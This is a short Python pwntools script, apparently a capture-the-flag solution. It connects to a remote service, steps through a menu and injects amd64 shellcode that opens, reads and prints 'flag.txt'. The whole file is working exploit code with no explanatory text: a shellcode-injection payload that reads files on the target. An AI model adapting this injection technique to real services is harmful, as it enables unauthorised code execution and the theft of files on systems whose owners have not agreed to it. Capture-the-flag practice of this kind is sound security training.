#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io):
    shellcode = asm("""
                    lea rdi, [rip + flag]
                    xor rsi, rsi
                    mov rax, 2
                    syscall
                    
                    mov rdi, rax
                    mov rsi, rsp
                    mov rdx, 64
                    xor rax, rax
                    syscall
                    
                    mov rdi, 1
                    mov rax, 1
                    syscall

                    flag:
                        .string "flag.txt"

    """)
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", shellcode)
    flag = io.recvline().decode()
    print(flag)

def main():
    HOST, PORT = sys.argv[1].split(":")
    io = remote(HOST, PORT)
    exploit(io)

if __name__ == "__main__":
    main()
